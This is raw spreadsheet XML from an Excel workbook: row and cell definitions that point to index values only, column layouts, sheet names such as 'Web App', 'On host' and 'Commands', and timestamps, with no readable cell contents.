        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1">
      <c r="A2" s="1" t="s">
        <v>77</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>69</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>70</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>71</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>74</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>73</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1">
      <c r="A3" s="1" t="s">
        <v>77</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>75</v>
      </c>
      <c r="I3" s="5"/>
      <c r="J3" s="4" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1">
      <c r="A4" s="1"/>
      <c r="E4" s="1"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1">
      <c r="A5" s="1"/>
      <c r="J5" s="4"/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388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:B27"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="A19" sqref="A19"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1"/>
  <cols>
    <col min="1" max="1" width="175" style="6" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>29</v>
      </c>
    </row>
    <row r="2" spans="1:2" ht="15" customHeight="1">
      <c r="A2" s="2" t="s">
        <v>79</v>
      </c>
    </row>
    <row r="3" spans="1:2" ht="15" customHeight="1">
      <c r="A3" s="2" t="s">
        <v>80</v>
      </c>
    </row>
    <row r="4" spans="1:2" ht="15" customHeight="1">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" ht="15" customHeight="1">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" ht="15" customHeight="1">
      <c r="A6" s="6" t="s">
        <v>81</v>
      </c>
    </row>
    <row r="7" spans="1:2" ht="15" customHeight="1">
      <c r="A7" s="6" t="s">
        <v>23</v>
      </c>
    </row>
    <row r="8" spans="1:2" ht="15" customHeight="1">
      <c r="A8" s="6" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="9" spans="1:2" ht="15" customHeight="1">
      <c r="A9" s="6" t="s">
        <v>83</v>
      </c>
    </row>
    <row r="10" spans="1:2" ht="15" customHeight="1">
      <c r="A10" s="6" t="s">
        <v>84</v>
      </c>
    </row>
    <row r="11" spans="1:2" ht="15" customHeight="1">
      <c r="A11" s="6" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="12" spans="1:2" ht="15" customHeight="1">
      <c r="A12" s="6" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="13" spans="1:2" ht="15" customHeight="1">
      <c r="A13" s="6" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="14" spans="1:2" ht="15" customHeight="1">
      <c r="A14" s="6" t="s">
        <v>85</v>
      </c>
    </row>
    <row r="15" spans="1:2" ht="15" customHeight="1">
      <c r="A15" s="6" t="s">
        <v>86</v>
      </c>
    </row>
    <row r="16" spans="1:2" ht="15" customHeight="1">
      <c r="A16" s="6" t="s">
        <v>87</v>
      </c>
    </row>
    <row r="17" spans="1:1" ht="15" customHeight="1">
      <c r="A17" s="6" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="18" spans="1:1" ht="15" customHeight="1">
      <c r="A18" s="6" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="19" spans="1:1" ht="15" customHeight="1">
      <c r="A19" s="6" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="20" spans="1:1" ht="15" customHeight="1">
      <c r="A20" s="6" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="21" spans="1:1" ht="15" customHeight="1">
      <c r="A21" s="6" t="s">
        <v>88</v>
      </c>
    </row>
    <row r="22" spans="1:1" ht="15" customHeight="1">
      <c r="A22" s="6" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="23" spans="1:1" ht="15" customHeight="1">
      <c r="A23" s="6" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="24" spans="1:1" ht="15" customHeight="1">
      <c r="A24" s="6" t="s">
        <v>91</v>
      </c>
    </row>
    <row r="25" spans="1:1" ht="15" customHeight="1">
      <c r="A25" s="6" t="s">
        <v>92</v>
      </c>
    </row>
    <row r="26" spans="1:1" ht="15" customHeight="1">
      <c r="A26" s="6" t="s">
        <v>72</v>
      </c>
    </row>
    <row r="27" spans="1:1" ht="15" customHeight="1">
      <c r="A27" s="8" t="s">
        <v>89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AFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C9" sqref="C9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1">
      <c r="A2" s="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2D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D23" sqref="D23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1">
      <c r="A1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>24</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:4">
      <c r="D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Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse 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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-18T11:39:19Z</dcterms:modified>
</cp:coreProperties>
</file>